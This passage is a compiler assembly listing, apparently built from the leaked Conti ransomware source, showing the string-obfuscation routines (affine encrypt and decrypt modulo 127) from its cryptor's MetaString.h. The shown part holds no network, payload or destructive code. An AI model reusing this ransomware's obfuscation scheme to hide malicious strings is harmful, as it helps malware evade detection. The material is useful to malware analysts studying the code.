  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 10	 add	 eax, 16
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 27	 sub	 eax, 39			; 00000027H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 10	 sub	 eax, 16
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 10	 add	 r8d, 16
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 3f	 sub	 eax, 63			; 0000003fH
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3f	 add	 r8d, 63			; 0000003fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0c 00 00 00	 mov	 ecx, 12
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 49 00 00 00	 mov	 ecx, 73			; 00000049H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 49
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+73]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
